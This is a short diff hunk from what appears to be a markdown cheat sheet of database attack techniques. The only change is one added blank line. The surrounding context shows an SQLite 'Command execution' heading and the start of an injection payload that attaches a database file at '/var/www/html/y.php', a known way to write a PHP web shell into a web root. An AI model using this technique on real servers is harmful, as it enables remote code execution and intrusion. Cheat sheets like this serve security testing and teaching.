@@ -139,6 +139,7 @@ x=1<@/length_2><@/set_var_1>
 #### SQLite  
 Connect:  
 `$ sqlite3 test.db`  
+
 Command execution:  
 ```sql
 ATTACH DATABASE '/var/www/html/y.php' AS y;--
